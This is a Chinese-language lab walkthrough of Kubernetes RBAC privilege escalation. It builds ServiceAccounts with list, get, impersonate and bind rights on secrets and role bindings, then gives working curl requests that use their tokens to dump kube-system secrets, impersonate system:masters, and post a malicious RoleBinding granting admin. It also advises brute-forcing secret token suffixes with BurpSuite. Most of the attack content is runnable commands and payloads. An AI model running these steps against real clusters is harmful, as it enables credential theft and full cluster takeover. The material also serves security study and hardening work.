![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665471518963-3b574a09-c234-4280-a771-a33a866bad20.png)

```plain
#创建hx-sa-list-secrets ServiceAccount
kubectl create sa hx-sa-list-secrets -n kube-system

#创建角色
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: hx-sa-list-secrets-role
  namespace: kube-system
rules:
- apiGroups: ["*"]
  resources: ["secrets"]
  verbs: ["list"]


#创建角色绑定
kind: RoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: hx-sa-list-secrets-rolebinding
  namespace: kube-system
subjects:
- kind: ServiceAccount
  name: hx-sa-list-secrets
  namespace: kube-system
roleRef:
  kind: Role
  name: hx-sa-list-secrets-role
  apiGroup: rbac.authorization.k8s.io


获取指定service account的token
sudo kubectl get secret -n kube-system |grep hx-sa-list-secrets
sudo kubectl get secret hx-sa-list-secrets-token-w2tsl -o jsonpath={.data.token} -n kube-system |base64 -d
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665469994515-340c7518-11f2-4e75-8d2c-89bfbcb4b230.png)

获取Service Account token后，携带Bearer header进行利用，列举secret凭证

```plain
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665470050613-81115cd0-d5a6-44dc-91d2-2e3389033318.png)

### Get secrets
![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665471551459-57e3eb95-2c07-4d0b-8c95-6c6677670915.png)

```plain
#创建hx-sa-get-secrets ServiceAccount
kubectl create sa hx-sa-get-secrets -n kube-system

#创建角色
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: hx-sa-get-secrets-role
  namespace: kube-system
rules:
- apiGroups: ["*"]
  resources: ["secrets"]
  verbs: ["get"]


#创建角色绑定
kind: RoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: hx-sa-get-secrets-rolebinding
  namespace: kube-system
subjects:
- kind: ServiceAccount
  name: hx-sa-get-secrets
  namespace: kube-system
roleRef:
  kind: Role
  name: hx-sa-get-secrets-role
  apiGroup: rbac.authorization.k8s.io


获取指定service account的token
sudo kubectl get secret -n kube-system |grep hx-sa-get-secrets
sudo kubectl get secret hx-sa-get-secrets-token-qrqhl -o jsonpath={.data.token} -n kube-system |base64 -d

```

获取Service Account token后，携带Bearer header进行利用，获取指定服务用户的token

```plain
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/<secrets name>
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665470301631-9c5b353a-83bd-4cc9-9bfc-f825125b169b.png)

如何获取secret name呢？

```plain
#在Master节点上列举ServiceAccount
kubectl get sa --all-namespaces
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665470603550-e7ced8b3-9ee4-48bc-b589-3a536eaa6103.png)

```plain
#再列举secret
kubectl -n kube-system get secret
发现secret名称为ServiceAccount名称加"-token-xxxx"
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665470621768-5bc35f24-05b6-423b-bc23-627aa15ee215.png)

```plain
token后边的随机字符串，为“bcdfghjklmnpqrstvwxz2456789”这27个字符组成的
```

> [https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#183%EF%BC%9A#:~:text=bcdfghjklmnpqrstvwxz2456789](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#183%EF%BC%9A#:~:text=bcdfghjklmnpqrstvwxz2456789)
>
> ![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665470831355-403f4290-9f86-4e32-8363-ee7f2ce7cdc0.png)
>

利用时使用BurpSuite进行爆破即可

### <font style="color:rgb(17, 17, 17);">Impersonate</font>
![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665471614035-fb4806f3-50dc-4706-a443-2e29abcc7987.png)

```plain
#创建hx-sa-impersonate ServiceAccount
kubectl create sa hx-sa-impersonate -n kube-system

#创建角色
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: hx-sa-impersonate-role
rules:
- apiGroups: ["*"]
  resources: ["users","groups"]
  verbs: ["impersonate"]


#创建角色绑定
kind: ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: hx-sa-impersonate-rolebinding
subjects:
- kind: ServiceAccount
  name: hx-sa-impersonate
  namespace: kube-system
roleRef:
  kind: ClusterRole
  name: hx-sa-impersonate-role
  apiGroup: ""


#获取指定ServiceAccount的token
sudo kubectl get secret -n kube-system |grep hx-sa-impersonate
sudo kubectl get secret hx-sa-impersonate-token-qxt7l -o jsonpath={.data.token} -n kube-system |base64 -d
```

模拟用户成功提权

```plain
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \ -H "Impersonate-Group: system:masters"\ -H "Impersonate-User: null" \ -H "Accept: application/json" \ https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665471325885-59d5a24a-855b-4e66-8b87-f9269b1acdc9.png)

### Bind
用有bind权限允许用户将高角色绑定到当前已经被控制的帐户导致权限提权。

```plain
#创建hx-sa-bind-test ServiceAccount
kubectl create sa hx-sa-bind-test

#创建角色，下面的ClusterRole使用了bind权限，允许用户创建一个绑定ClusterRole(默认的高特权角色)的RoleBinding，并添加任何用户，包括自己
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: hx-sa-bind-role
rules:
- apiGroups: ["*"]
  resources: ["rolebindings"]
  verbs: ["create"]
- apiGroups: ["*"]
  resources: ["clusterroles"]
  verbs: ["bind"]
  resourceNames: ["admin"]

#创建角色绑定
kind: ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: hx-sa-bind-rolebinding
subjects:
- kind: ServiceAccount
  name: hx-sa-bind-test
  namespace: default
roleRef:
  kind: ClusterRole
  name: hx-sa-bind-role
  apiGroup: ""

#获取指定service account的token
sudo kubectl get secret  |grep hx-sa-bind-test
sudo kubectl get secret hx-sa-bind-test-token-n82cs -o jsonpath={.data.token}  |base64 -d
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665473052500-2ca49aaa-b29a-4d95-9cb4-69e54ebc901c.png)



在未进行利用前，hx-sa-bind-test账号没有权限列举default名称空间下的secrets凭证

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665473275453-420ce624-d4e0-4c0f-a96e-0a3106918b76.png)进行绑定

```plain
#添加当前用户到绑定高权限ClusterRole的ClusterRoleBinding中
curl -k -v -X POST -H "Authorization: Bearer eyJhbG..." -H "Content-Type: application/json" https://10.206.0.2:6443/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-RoleBinging.json

#malicious-RoleBinging.json
{"apiVersion":"rbac.authorization.k8s.io/v1","kind":"RoleBinding","metadata":{"name":"malicious-rolebinding"，json数据不要换行，会有格式问题
},"roleRef":{"apiGroup":"rbac.authorization.k8s.io","kind":"ClusterRole","name":"admin"},"subjects":[{"kind":"ServiceAccount","name":"hx-sa-bind-test","namespace":"default"}]}
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665473433799-cd231bcf-8876-4cac-b16f-8dae98cb7f65.png)

成功提权ServiceAccount权限，可列举default名称空间下的secrets凭证

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665473466451-5b7baca6-5e11-4702-8aa8-8148a19850b8.png)







